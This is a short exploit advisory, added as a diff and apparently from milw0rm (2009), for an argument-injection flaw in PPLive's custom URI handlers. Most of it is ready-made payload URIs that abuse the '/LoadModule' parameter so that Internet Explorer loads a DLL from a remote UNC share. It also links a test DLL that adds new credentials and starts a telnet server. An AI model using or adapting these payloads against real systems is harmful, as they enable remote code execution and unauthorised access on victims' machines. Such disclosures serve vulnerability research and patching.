@@ -1,0 +1,34 @@
+--------------------------------------------------------------------------------
+PPLive <= 1.9.21 uri handlers "/LoadModule" remote argument injection
+by Nine:Situations:Group::strawdog
+--------------------------------------------------------------------------------
+software site:http://www.pplive.com/en/index.html
+our site: http://retrogod.altervista.org/
+
+software description:
+"PPLive is a peer-to-peer streaming video network created in Huazhong University
+of Science and Technology, People's Republic of China. It is part of a new
+generation of P2P applications, that combine P2P and Internet TV, called P2PTV."
+
+vulnerability:
+The "synacast://", "Play://" ,"pplsv://" and "ppvod://" URI handlers do not
+verify certain parts of the URI before evaluating command line parameters.
+This can be exploited against Internet Explorer to e.g. load a dll from a remote
+UNC path via the "/LoadModule" parameter, example exploit (IE7):
+
+synacast://www.microsoft.com/?"%20/LoadModule%20\1.2.3.4\unc_share\sh.dll%20"
+Play://www.microsoft.com/?"%20/LoadModule%20\\1.2.3.4\unc_share\sh.dll%20"
+
+against older versions:
+pplsv://www.microsoft.com/?"%20/LoadModule%20\\1.2.3.4\unc_share\sh.dll%20"
+ppvod://www.microsoft.com/?"%20/LoadModule%20\\1.2.3.4\unc_share\sh.dll%20"
+
+test dll which adds new credentials / spawns the telnet server:
+http://retrogod.altervista.org/9sg_pplive_sh.html
+
+some interesting readings:
+http://msdn.microsoft.com/en-us/library/aa767914(VS.85).aspx
+
+--------------------------------------------------------------------------------
+
+# milw0rm.com [2009-03-16]
